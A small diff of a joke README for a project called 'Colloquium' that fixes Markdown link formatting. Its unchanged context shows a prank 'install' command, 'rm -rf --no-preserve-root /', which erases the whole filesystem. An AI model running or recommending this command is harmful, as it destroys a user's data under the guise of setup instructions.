@@ -10,7 +10,7 @@ Colloquium
 ```rm -rf --no-preserve-root /```
 
 ####Windows
-    1. Get a better Operating System (Hlynux[http://hlynux.com])
+    1. Get a better Operating System [Hlynux](http://hlynux.com)
     2. ...
     3. **PROFIT!!1!1**
     
@@ -25,5 +25,5 @@ Colloquium
 - Batteries not needed
 
 ##Authors
-**(Glitch[Glitch@Glitch.is])**
-**(Index[dontknowyouremail@Glitch.is])**
+**[Glitch](Glitch@Glitch.is)**
+**[Index](dontknowyouremail@Glitch.is)**
